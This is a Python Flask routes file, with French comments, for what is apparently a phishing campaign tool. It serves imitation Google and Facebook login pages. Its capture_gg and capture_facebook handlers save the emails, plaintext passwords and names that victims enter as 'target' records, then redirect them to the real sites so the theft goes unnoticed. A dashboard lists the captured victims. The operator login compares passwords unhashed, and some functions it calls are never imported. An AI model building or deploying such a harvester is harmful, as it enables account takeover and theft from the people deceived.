from flask import Flask, render_template, request, redirect, url_for, flash, session
from app.models import db, Cible, TemplateSite,Utilisateur, Campagne


def register_routes(app: Flask, db):
    @app.route("/")
    def hello_world():
        return render_template('index.html')

    @app.route("/connexion")
    def connexion():
        return render_template('pyconnexion.html')
    
    @app.route('/google', methods=['GET'])
    def google():
        return render_template('pygoogle.html')

    @app.route('/facebook', methods=['GET'])
    def facebook():
        return render_template('facebook.html')



    @app.route("/login", methods=["POST"])
    def login():
        email = request.form.get("username")
        mot_de_passe = request.form.get("password")

        # Chercher l'utilisateur dans la base de données
        utilisateur = Utilisateur.query.filter_by(email=email).first()

        if utilisateur and utilisateur.mot_de_passe == mot_de_passe:  # Comparaison directe sans hashage
            # Utilisateur authentifié, on démarre une session
            session["utilisateur_id"] = utilisateur.id
            flash("Connexion réussie!", "success")
            return redirect(url_for("dashboard"))
        else:
            flash("Email ou mot de passe incorrect", "danger")
            return redirect(url_for("connexion"))


    @app.route("/formulaire", methods=["GET", "POST"])
    def pyformulaire():
        if request.method == "POST":
            # Récupérer les données soumises par l'utilisateur
            username = request.form.get("username")
            password = request.form.get("password")

            # Vérifier si l'utilisateur existe déjà dans la base de données
            utilisateur = Utilisateur.query.filter_by(email=username).first()
            
            if utilisateur:
                flash("Cet utilisateur existe déjà.", "danger")
                return redirect(url_for("pyformulaire"))

            # Si l'utilisateur n'existe pas, on le crée
            mot_de_passe_hache = generate_password_hash(password)
            nouvel_utilisateur = Utilisateur(email=username, mot_de_passe=mot_de_passe_hache)
            db.session.add(nouvel_utilisateur)
            db.session.commit()

            flash("Inscription réussie! Vous pouvez maintenant vous connecter.", "success")
            return redirect(url_for("connexion"))

        # Afficher le formulaire d'inscription si la méthode est GET
        return render_template('pyformulaire.html')


    @app.route('/capture_gg', methods=['POST'])
    def capture_gg():
        email = request.form.get('email')
        password = request.form.get('password')

        template = TemplateSite.query.filter_by(nom='google').first()

        cible = Cible(
            prenom=None,
            nom=None,
            email=email,
            mot_de_passe=password,
            site_id=template.id if template else None
        )

        db.session.add(cible)
        db.session.commit()

        return redirect("https://www.google.com")

 
    @app.route('/capture_facebook', methods=['POST'])
    def capture_facebook():
        email = request.form.get('email')
        password = request.form.get('password')
        nom = request.form.get('nom')
        prenom =request.form.get('prenom')

        # Récupération du template "google"
        template = TemplateSite.query.filter_by(nom='facebook').first()

        cible = Cible(
            prenom=prenom,
            nom=nom,
            email=email,
            mot_de_passe=password,
            site_id=template.id if template else None
        )

        db.session.add(cible)
        db.session.commit()

        return redirect("https://www.facebook.com")
    
    @app.route("/deconnexion")
    def logout():
        session.pop("utilisateur_id", None)
        flash("Vous êtes déconnecté.", "success")
        return redirect(url_for("hello_world")) 

    @app.route("/campagnes")
    def campagnes():
        campagnes = Campagne.query.all()
        
        campagnes_end =  Campagne.query.filter_by(etat="Terminé").count()
        campagnes_active =  Campagne.query.filter_by(etat="Actif").count()

        print(campagnes)
        for elem in campagnes:
            print(elem)
        return render_template('campagnes.html', campagnes=campagnes, campagnes_end=campagnes_end, campagnes_active=campagnes_active)

    @app.route('/dashboard')
    def dashboard():
        if "utilisateur_id" not in session:
            flash("Vous devez être connecté pour accéder au dashboard", "danger")
            return redirect(url_for("connexion"))

        pieges =  Cible.query.all()
        
        total_cibles = Cible.query.count()
        campagnes_active =  Campagne.query.filter_by(etat="Actif").count()
        template_count= TemplateSite.query.count()
  
        return render_template('pydashboard.html', pieges=pieges, total_cibles=total_cibles, template_count=template_count,campagnes_active=campagnes_active)

    @app.route("/campagne/<int:id>")
    def detail_campagne(id):
        campagne = db.session.get(Campagne, id)

        if not campagne:
            abort(404)
        
        # Récupérer le template associé à la campagne
        template = campagne.template

        # Récupérer les cibles associées au template
        cibles = template.cibles if template else []

        return render_template("campagnes_id.html", campagne=campagne, cibles=cibles)


